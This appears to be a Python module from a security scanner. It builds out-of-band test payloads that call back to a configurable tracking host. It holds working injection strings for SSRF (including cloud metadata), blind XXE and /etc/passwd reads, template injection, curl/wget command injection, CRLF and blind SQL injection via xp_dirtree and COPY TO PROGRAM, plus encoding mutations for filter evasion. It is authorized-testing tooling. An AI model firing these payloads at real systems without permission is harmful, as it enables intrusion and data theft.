"""
OOB payload generator — SSRF / XXE / SSTI / RCE / CRLF / SQLi / CMDi templates.

Each payload embeds a unique interaction_id (phantom-grid token) for tracking.
HTTP callbacks target the v2.0 capture endpoint: http://<host>/c/<token>.
DNS callbacks use <token>.<host>.
"""

from typing import Dict, List


def generate_ssrf_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
    """HTTP/DNS SSRF payloads pointing to phantom-grid."""
    base = f"{grid_host}/c/{interaction_id}"
    dns = f"{interaction_id}.{grid_host}"
    return [
        {
            "type": "ssrf_http",
            "payload": f"http://{base}",
            "description": "Basic HTTP SSRF — phantom-grid callback",
        },
        {
            "type": "ssrf_https",
            "payload": f"https://{base}",
            "description": "HTTPS SSRF",
        },
        {
            "type": "ssrf_dns",
            "payload": f"http://{dns}",
            "description": "DNS-based SSRF — triggers OOB DNS lookup",
        },
        {
            "type": "ssrf_169",
            "payload": "http://169.254.169.254/latest/meta-data/",
            "description": "AWS metadata SSRF",
        },
    ]


def generate_xxe_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
    """Blind XXE payloads with OOB DNS/HTTP exfil."""
    url = f"http://{grid_host}/c/{interaction_id}"
    return [
        {
            "type": "xxe_oob_http",
            "payload": f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{url}">
]>
<root>&xxe;</root>""",
            "description": "Blind XXE — HTTP OOB to phantom-grid",
        },
        {
            "type": "xxe_oob_dns",
            "payload": f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{interaction_id}.{grid_host}/">
  %xxe;
]>
<root/>""",
            "description": "Blind XXE — DNS OOB exfil",
        },
        {
            "type": "xxe_file_read",
            "payload": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
            "description": "XXE local file read — /etc/passwd",
        },
    ]


def generate_ssti_payloads() -> List[Dict[str, str]]:
    """SSTI detection payloads for common template engines."""
    return [
        {
            "type": "ssti_jinja2",
            "payload": "{{7*7}}",
            "expected": "49",
            "description": "Jinja2/Twig SSTI — expect 49 in response",
        },
        {
            "type": "ssti_jinja2_config",
            "payload": "{{config}}",
            "expected": "Config",
            "description": "Jinja2 config dump",
        },
        {
            "type": "ssti_freemarker",
            "payload": "${7*7}",
            "expected": "49",
            "description": "FreeMarker / Spring SSTI",
        },
        {
            "type": "ssti_erb",
            "payload": "<%= 7*7 %>",
            "expected": "49",
            "description": "Ruby ERB SSTI",
        },
        {
            "type": "ssti_smarty",
            "payload": "{$smarty.version}",
            "expected": "Smarty",
            "description": "Smarty SSTI",
        },
    ]


def generate_rce_oob_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
    """OOB RCE confirmation payloads via DNS/HTTP callback."""
    url = f"http://{grid_host}/c/{interaction_id}"
    return [
        {
            "type": "rce_curl",
            "payload": f"curl {url}",
            "description": "RCE via curl — HTTP callback to phantom-grid",
        },
        {
            "type": "rce_wget",
            "payload": f"wget -q {url}",
            "description": "RCE via wget",
        },
        {
            "type": "rce_dns_nslookup",
            "payload": f"nslookup {interaction_id}.{grid_host}",
            "description": "RCE — DNS OOB via nslookup",
        },
        {
            "type": "rce_dns_ping",
            "payload": f"ping -c1 {interaction_id}.{grid_host}",
            "description": "RCE — DNS OOB via ping",
        },
    ]


def generate_crlf_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
    """CRLF / HTTP header injection with OOB callback confirmation."""
    cb = f"http://{grid_host}/c/{interaction_id}"
    return [
        {
            "type": "crlf_header_inject",
            "payload": f"%0d%0aLocation:%20{cb}",
            "description": "CRLF — inject Location header redirect to phantom-grid",
        },
        {
            "type": "crlf_response_split",
            "payload": (
                f"%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/c/{interaction_id}%20HTTP/1.1"
            ),
            "description": "CRLF — response splitting with embedded callback path",
        },
        {
            "type": "crlf_set_cookie",
            "payload": f"%0d%0aSet-Cookie:%20oob={interaction_id}",
            "description": "CRLF — Set-Cookie injection marker",
        },
    ]


def generate_sqli_oob_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
    """Blind SQLi OOB exfiltration — Oracle / MSSQL / MySQL / PostgreSQL."""
    http = f"http://{grid_host}/c/{interaction_id}"
    dns = f"{interaction_id}.{grid_host}"
    return [
        {
            "type": "sqli_oracle_utl_http",
            "payload": f"' || UTL_HTTP.REQUEST('{http}') || '",
            "description": "Oracle OOB via UTL_HTTP.REQUEST",
        },
        {
            "type": "sqli_oracle_dns",
            "payload": (f"' || (SELECT DBMS_LDAP.INIT('{dns}',80) FROM DUAL) || '"),
            "description": "Oracle OOB DNS via DBMS_LDAP.INIT",
        },
        {
            "type": "sqli_mssql_xp_dirtree",
            "payload": f"'; EXEC master..xp_dirtree '\\\\{dns}\\x'; --",
            "description": "MSSQL OOB via xp_dirtree UNC path (SMB/DNS)",
        },
        {
            "type": "sqli_mysql_load_file",
            "payload": f"' UNION SELECT LOAD_FILE(CONCAT('\\\\{dns}\\a')) -- -",
            "description": "MySQL OOB via LOAD_FILE UNC (Windows)",
        },
        {
            "type": "sqli_pg_copy_program",
            "payload": f"'; COPY (SELECT '') TO PROGRAM 'curl {http}'; --",
            "description": "PostgreSQL OOB via COPY TO PROGRAM",
        },
    ]


def generate_cmdi_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
    """Command injection OOB — separators with HTTP/DNS callback."""
    http = f"http://{grid_host}/c/{interaction_id}"
    dns = f"{interaction_id}.{grid_host}"
    return [
        {
            "type": "cmdi_backtick",
            "payload": f"`curl {http}`",
            "description": "CMDi via backtick substitution",
        },
        {
            "type": "cmdi_dollar_paren",
            "payload": f"$(curl {http})",
            "description": "CMDi via $() substitution",
        },
        {
            "type": "cmdi_pipe",
            "payload": f"| curl {http}",
            "description": "CMDi via pipe",
        },
        {
            "type": "cmdi_semicolon",
            "payload": f"; curl {http}",
            "description": "CMDi via semicolon separator",
        },
        {
            "type": "cmdi_dns_newline",
            "payload": f"%0anslookup {dns}",
            "description": "CMDi via newline + DNS lookup",
        },
    ]


def get_all_payloads(grid_host: str, interaction_id: str) -> Dict[str, List[Dict[str, str]]]:
    """Return all payload categories keyed by type."""
    return {
        "ssrf": generate_ssrf_payloads(grid_host, interaction_id),
        "xxe": generate_xxe_payloads(grid_host, interaction_id),
        "ssti": generate_ssti_payloads(),
        "rce": generate_rce_oob_payloads(grid_host, interaction_id),
        "crlf": generate_crlf_payloads(grid_host, interaction_id),
        "sqli": generate_sqli_oob_payloads(grid_host, interaction_id),
        "cmdi": generate_cmdi_payloads(grid_host, interaction_id),
    }


def _mutations(value: str):
    """Yield (label, variant) encoding/obfuscation transforms of a payload."""
    from urllib.parse import quote

    yield "urlenc", quote(value, safe="")
    yield "double_urlenc", quote(quote(value, safe=""), safe="")
    if "://" in value:
        scheme, rest = value.split("://", 1)
        yield "at_embed", f"{scheme}://trusted.example@{rest}"


def mutate_payloads(payloads: List[Dict[str, str]]) -> List[Dict[str, str]]:
    """Generate deduplicated encoding/obfuscation variants for a retry round."""
    mutated: List[Dict[str, str]] = []
    seen: set[str] = set()
    for p in payloads:
        original = p.get("payload", "")
        if not original:
            continue
        for label, variant in _mutations(original):
            if variant == original or variant in seen:
                continue
            seen.add(variant)
            mutated.append(
                {
                    "type": f"{p.get('type', 'payload')}_{label}",
                    "payload": variant,
                    "description": f"Mutated ({label}) of {p.get('type', 'payload')}",
                }
            )
    return mutated
